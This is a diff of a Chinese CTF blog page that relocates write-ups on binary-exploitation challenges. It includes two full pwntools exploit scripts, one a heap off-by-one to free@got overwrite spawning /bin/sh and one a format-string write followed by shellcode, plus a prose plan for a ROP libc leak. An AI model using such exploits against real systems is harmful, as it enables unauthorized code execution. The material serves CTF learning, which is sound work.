@@ -62,20 +62,92 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-string" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-HITCON-Trainging-lab13" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2020/04/16/string/" class="article-date">
-  <time datetime="2020-04-16T06:32:43.830Z" itemprop="datePublished">2020-04-16</time>
+    <a href="/2020/04/16/HITCON-Trainging-lab13/" class="article-date">
+  <time datetime="2020-04-16T07:27:36.000Z" itemprop="datePublished">2020-04-16</time>
 </a>
     
   </div>
   <div class="article-inner">
     
     
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/04/16/HITCON-Trainging-lab13/">HITCON Trainging lab13</a>
+    </h1>
+  
+
+      </header>
+    
     <div class="article-entry" itemprop="articleBody">
       
-        <p>0x00  函数分析</p>
-<p>基本信息</p>
+        <p>chunk-extend学习，一个友好的题目，<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/hitcontraning_lab13" target="_blank" rel="noopener">下载地址</a></p>
+<h3 id="0x00-程序分析"><a href="#0x00-程序分析" class="headerlink" title="0x00 程序分析"></a>0x00 程序分析</h3><p>基本信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/ububtu/ctf/pwn/heapcreator&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+<p>64位elf，开启了Canary和NX保护</p>
+<p>分析main函数</p>
+<p><img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1586611734293.png" alt="1586611734293"></p>
+<p>大概是一个自定义的堆分配器，每个堆主要有两个成员：大小与内容指针</p>
+<ol>
+<li>创建堆，根据用户输入的长度，申请对应内存空间，并利用 read 读取指定长度内容。这里长度没有进行检测，当长度为负数时，会出现任意长度堆溢出的漏洞。当然，前提是可以进行 malloc。此外，这里读取之后并没有设置 NULL。</li>
+<li>编辑堆，根据指定的索引以及之前存储的堆的大小读取指定内容，但是这里读入的长度会比之前大 1，所以会<strong>存在 <a href="https://blog.csdn.net/nibiru_holmes/article/details/62040763" target="_blank" rel="noopener">off-by-one</a>的漏洞</strong>。</li>
+<li>展示堆，输出指定索引堆的大小以及内容。</li>
+<li>删除堆，删除指定堆，并且将对应指针设置为了 NULL。</li>
+</ol>
+<h3 id="0x01-漏洞利用"><a href="#0x01-漏洞利用" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h3><p>函数edit_heap()</p>
+<p><img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1586612923039.png" alt="1586612923039"></p>
+<p>heaparray[v1]中存放的是chunk的size,(*heaparray[v1]+1)其实就是heaparray[v1+1]中存放的是堆的指针。</p>
+<p>分析create_heap()</p>
+<p><img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1586613176346.png" alt="1586613176346"></p>
+<p>heaparray就在堆上,可以直接改heaparray上的指针。</p>
+<p>基本利用思路:</p>
+<ol>
+<li>利用off by one 漏洞覆盖下一个chunk 的 size 字段，从而构造伪造的 chunk 大小。</li>
+<li>申请伪造的 chunk 大小，从而产生 chunk overlap，进而修改关键指针。</li>
+</ol>
+<h3 id="0x02-exp"><a href="#0x02-exp" class="headerlink" title="0x02 exp"></a>0x02 exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./heapcreator'</span>)</span><br><span class="line">heap = ELF(<span class="string">'./heapcreator'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">free_got = <span class="number">0x602018</span></span><br><span class="line">create(<span class="number">0x18</span>, <span class="string">"dada"</span>)  <span class="comment"># 0</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">"ddaa"</span>)  <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">＃将堆<span class="number">1</span>的结构大小改写为<span class="number">0x41</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span> + <span class="string">"a"</span> * <span class="number">0x10</span> + <span class="string">"\x41"</span>)</span><br><span class="line"></span><br><span class="line">＃触发堆<span class="number">1</span>的结构到fastbin <span class="number">0x40</span></span><br><span class="line">＃将<span class="number">1</span>的内容堆到fastbin <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">＃新堆<span class="number">1</span>的结构将指向旧堆<span class="number">1</span>的内容，大小为<span class="number">0x20</span></span><br><span class="line">＃新堆<span class="number">1</span>的内容将指向旧堆<span class="number">1</span>的结构，大小为<span class="number">0x30</span></span><br><span class="line">＃也就是说我们可以覆盖新堆<span class="number">1</span>的结构</span><br><span class="line">＃在这里，我们将其堆内容指针覆盖为free @ got</span><br><span class="line">create(<span class="number">0x30</span>, p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0x30</span>) + p64(heap.got[<span class="string">'free'</span>]))  <span class="comment">#1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak freeaddr</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Content : "</span>)</span><br><span class="line">data = r.recvuntil(<span class="string">"Done !"</span>)</span><br><span class="line"></span><br><span class="line">free_addr = u64(data.split(<span class="string">"\n"</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">libc_base = free_addr - libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">log.success(<span class="string">'libc base addr: '</span> + hex(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"><span class="comment">#用系统地址覆盖free @ got</span></span><br><span class="line">edit(<span class="number">1</span>, p64(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#trigger system("/bin/sh")</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<p>最后，记录下一位师傅做到<a href="https://blog.csdn.net/qq_40934487/article/details/91465347" target="_blank" rel="noopener">一道堆题的博客</a></p>
+<p>​     </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/04/16/HITCON-Trainging-lab13/" data-id="ck92g3mqn0001bwty1d6ly9ac" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-攻防世界-string" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/04/16/攻防世界-string/" class="article-date">
+  <time datetime="2020-04-16T07:27:09.000Z" itemprop="datePublished">2020-04-16</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/04/16/攻防世界-string/">攻防世界,string</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="0x00-函数分析"><a href="#0x00-函数分析" class="headerlink" title="0x00  函数分析"></a>0x00  函数分析</h3><p>基本信息</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/ububtu/ctf/string&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
 <p>64位，开启了Canary和NX保护， RELRO。</p>
 <p>载入IDA,分析逻辑，进入函数sub_400D72(),有三个函数， sub_400A7D();<br>sub_400BB9(); sub_400CA6((_DWORD *)a1);</p>
@@ -92,18 +164,16 @@
 <p>即要令<em>a1 == a1[1]，则需要</em>v3 == v3[1]。需要修改v3[0]为85</p>
 <p>而v3[0]的地址则在，main函数内可得到</p>
 <p><img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1585959372877.png" alt="1585959372877"></p>
-<p>0x01 漏洞利用</p>
-<p>根据程序流程执行输入，函数sub_400A7D()中注意输入east即可跳出;进入函数sub_400BB9()。</p>
+<h3 id="0x01-漏洞利用"><a href="#0x01-漏洞利用" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h3><p>根据程序流程执行输入，函数sub_400A7D()中注意输入east即可跳出;进入函数sub_400BB9()。</p>
 <p>在64位程序函数调用约定，前六个参数从左到右放入<em>RDI</em>, <em>RSI</em>, <em>RDX</em>, <em>ECX</em>, <em>R8</em>, <em>R9</em>中，利用<strong>格式化字符串漏洞</strong>，进入脆弱点，写入shellcode。可参考大佬博客</p>
 <p><a href="https://blog.csdn.net/xkj2010yj/article/details/104648885?depth_1-utm_source=distribute.pc_relevant.none-task-blog-OPENSEARCH-1&amp;utm_source=distribute.pc_relevant.none-task-blog-OPENSEARCH-1" target="_blank" rel="noopener">https://blog.csdn.net/xkj2010yj/article/details/104648885?depth_1-utm_source=distribute.pc_relevant.none-task-blog-OPENSEARCH-1&amp;utm_source=distribute.pc_relevant.none-task-blog-OPENSEARCH-1</a></p>
 <p>所以从n = 7开始，我们可以修改栈中的数据为85。</p>
-<p>0x02 exp</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#sh = process(&apos;./string&apos;)</span><br><span class="line">sh=remote(&apos;111.198.29.45&apos;,41867)</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;secret[0] is &apos;)</span><br><span class="line">v3_addr = int(sh.recvuntil(&quot;\n&quot;),16)</span><br><span class="line">print(v3_addr)</span><br><span class="line">sh.recvuntil(&apos;name be:&apos;)</span><br><span class="line">sh.sendline(&apos;zzz&apos;)</span><br><span class="line">sh.recvuntil(&apos;east or up?:&apos;)</span><br><span class="line">sh.sendline(&apos;east&apos;)</span><br><span class="line">sh.recvuntil(&apos;leave(0)?:&apos;)</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;\&apos;Give me an address\&apos;&apos;)</span><br><span class="line">sh.sendline(str(v3_addr))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;you wish is:&apos;)</span><br><span class="line">payload = &apos;%085d&apos; + &apos;%7$n&apos;</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;I will help you! USE YOU SPELL&apos;)</span><br><span class="line">sh.sendline(asm(shellcraft.amd64.linux.sh(),arch=&quot;amd64&quot;))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="0x02-exp"><a href="#0x02-exp" class="headerlink" title="0x02 exp"></a>0x02 exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#sh = process(&apos;./string&apos;)</span><br><span class="line">sh=remote(&apos;111.198.29.45&apos;,41867)</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;secret[0] is &apos;)</span><br><span class="line">v3_addr = int(sh.recvuntil(&quot;\n&quot;),16)</span><br><span class="line">print(v3_addr)</span><br><span class="line">sh.recvuntil(&apos;name be:&apos;)</span><br><span class="line">sh.sendline(&apos;zzz&apos;)</span><br><span class="line">sh.recvuntil(&apos;east or up?:&apos;)</span><br><span class="line">sh.sendline(&apos;east&apos;)</span><br><span class="line">sh.recvuntil(&apos;leave(0)?:&apos;)</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;\&apos;Give me an address\&apos;&apos;)</span><br><span class="line">sh.sendline(str(v3_addr))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;you wish is:&apos;)</span><br><span class="line">payload = &apos;%085d&apos; + &apos;%7$n&apos;</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;I will help you! USE YOU SPELL&apos;)</span><br><span class="line">sh.sendline(asm(shellcraft.amd64.linux.sh(),arch=&quot;amd64&quot;))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/04/16/string/" data-id="ck92fhlil0008bcty45h8j7jv" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/04/16/攻防世界-string/" data-id="ck92g3mr70007bwtyuu8tjloo" class="article-share-link">Share</a>
       
       
     </footer>
@@ -113,15 +183,25 @@
 
 
   
-    <article id="post-pwn200" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-攻防世界-pwn200" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2020/04/16/pwn200/" class="article-date">
-  <time datetime="2020-04-16T06:32:43.822Z" itemprop="datePublished">2020-04-16</time>
+    <a href="/2020/04/16/攻防世界-pwn200/" class="article-date">
+  <time datetime="2020-04-16T07:26:55.000Z" itemprop="datePublished">2020-04-16</time>
 </a>
     
   </div>
   <div class="article-inner">
     
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/04/16/攻防世界-pwn200/">攻防世界,pwn200</a>
+    </h1>
+  
+
+      </header>
     
     <div class="article-entry" itemprop="articleBody">
       
@@ -143,7 +223,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/04/16/pwn200/" data-id="ck92fhlik0007bctynwwceso8" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/04/16/攻防世界-pwn200/" data-id="ck92g3mrb0008bwtyurladspk" class="article-share-link">Share</a>
       
       
     </footer>
@@ -153,15 +233,25 @@
 
 
   
-    <article id="post-level3" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-攻防世界-level3" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2020/04/16/level3/" class="article-date">
-  <time datetime="2020-04-16T06:32:43.798Z" itemprop="datePublished">2020-04-16</time>
+    <a href="/2020/04/16/攻防世界-level3/" class="article-date">
+  <time datetime="2020-04-16T07:26:40.000Z" itemprop="datePublished">2020-04-16</time>
 </a>
     
   </div>
   <div class="article-inner">
     
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/04/16/攻防世界-level3/">攻防世界,level3</a>
+    </h1>
+  
+
+      </header>
     
     <div class="article-entry" itemprop="articleBody">
       
@@ -181,10 +271,8 @@
 <p>主要思路有以下几点：</p>
 <ul>
 <li>libc中的函数的相对地址是固定的，要想获取到system函数的地址，可以通过write()函数进行offset计算。</li>
-<li><p>在vulnerable_function()中，先调用了write()函数，然后调用read()函数。第一次攻击利用write()函数返回到vulnerable_function()后，再进行read()函数调用，这样就进行二次攻击。 </p>
-</li>
-<li><p>第一次攻击我们利用栈溢出将write()函数在got表中的真实地址泄露出来，然后减去libc中的offset，就可以得到libc的base address。</p>
-</li>
+<li>在vulnerable_function()中，先调用了write()函数，然后调用read()函数。第一次攻击利用write()函数返回到vulnerable_function()后，再进行read()函数调用，这样就进行二次攻击。 </li>
+<li>第一次攻击我们利用栈溢出将write()函数在got表中的真实地址泄露出来，然后减去libc中的offset，就可以得到libc的base address。</li>
 <li>再利用相对offset计算出system和”/bin/sh”的真实地址</li>
 <li>第二次攻击重新进入vulnerable_function()函数，再次通过栈溢出，利用system函数进行getshell。</li>
 </ul>
@@ -193,7 +281,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/04/16/level3/" data-id="ck92fhlid0004bctyuauvb3qx" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/04/16/攻防世界-level3/" data-id="ck92g3mr30006bwty6dqe3vh5" class="article-share-link">Share</a>
       
       
     </footer>
@@ -203,10 +291,10 @@
 
 
   
-    <article id="post-int_overflow" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-攻防世界-int-overflow" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2020/04/16/int_overflow/" class="article-date">
-  <time datetime="2020-04-16T06:32:43.789Z" itemprop="datePublished">2020-04-16</time>
+    <a href="/2020/04/16/攻防世界-int-overflow/" class="article-date">
+  <time datetime="2020-04-16T07:26:16.000Z" itemprop="datePublished">2020-04-16</time>
 </a>
     
   </div>
@@ -217,7 +305,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2020/04/16/int_overflow/">攻防世界 int_overflow</a>
+      <a class="article-title" href="/2020/04/16/攻防世界-int-overflow/">攻防世界,int_overflow</a>
     </h1>
   
 
@@ -249,59 +337,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/04/16/int_overflow/" data-id="ck92fhlij0006bctyjk9lzaen" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-HITCON Trainging lab13" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/04/16/HITCON Trainging lab13/" class="article-date">
-  <time datetime="2020-04-16T06:32:43.782Z" itemprop="datePublished">2020-04-16</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>chunk-extend学习，一个友好的题目，<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/hitcontraning_lab13" target="_blank" rel="noopener">下载地址</a></p>
-<h3 id="0x00-程序分析"><a href="#0x00-程序分析" class="headerlink" title="0x00 程序分析"></a>0x00 程序分析</h3><p>基本信息</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/ububtu/ctf/pwn/heapcreator&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
-<p>64位elf，开启了Canary和NX保护</p>
-<p>分析main函数</p>
-<p><img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1586611734293.png" alt="1586611734293"></p>
-<p>大概是一个自定义的堆分配器，每个堆主要有两个成员：大小与内容指针</p>
-<ol>
-<li>创建堆，根据用户输入的长度，申请对应内存空间，并利用 read 读取指定长度内容。这里长度没有进行检测，当长度为负数时，会出现任意长度堆溢出的漏洞。当然，前提是可以进行 malloc。此外，这里读取之后并没有设置 NULL。</li>
-<li>编辑堆，根据指定的索引以及之前存储的堆的大小读取指定内容，但是这里读入的长度会比之前大 1，所以会<strong>存在 <a href="https://blog.csdn.net/nibiru_holmes/article/details/62040763" target="_blank" rel="noopener">off-by-one</a>的漏洞</strong>。</li>
-<li>展示堆，输出指定索引堆的大小以及内容。</li>
-<li>删除堆，删除指定堆，并且将对应指针设置为了 NULL。</li>
-</ol>
-<h3 id="0x01-漏洞利用"><a href="#0x01-漏洞利用" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h3><p>函数edit_heap()</p>
-<p><img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1586612923039.png" alt="1586612923039"></p>
-<p>heaparray[v1]中存放的是chunk的size,(*heaparray[v1]+1)其实就是heaparray[v1+1]中存放的是堆的指针。</p>
-<p>分析create_heap()</p>
-<p><img src="C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1586613176346.png" alt="1586613176346"></p>
-<p>heaparray就在堆上,可以直接改heaparray上的指针。</p>
-<p>基本利用思路:</p>
-<ol>
-<li>利用off by one 漏洞覆盖下一个chunk 的 size 字段，从而构造伪造的 chunk 大小。</li>
-<li>申请伪造的 chunk 大小，从而产生 chunk overlap，进而修改关键指针。</li>
-</ol>
-<h3 id="0x02-exp"><a href="#0x02-exp" class="headerlink" title="0x02 exp"></a>0x02 exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./heapcreator'</span>)</span><br><span class="line">heap = ELF(<span class="string">'./heapcreator'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">free_got = <span class="number">0x602018</span></span><br><span class="line">create(<span class="number">0x18</span>, <span class="string">"dada"</span>)  <span class="comment"># 0</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">"ddaa"</span>)  <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">＃将堆<span class="number">1</span>的结构大小改写为<span class="number">0x41</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span> + <span class="string">"a"</span> 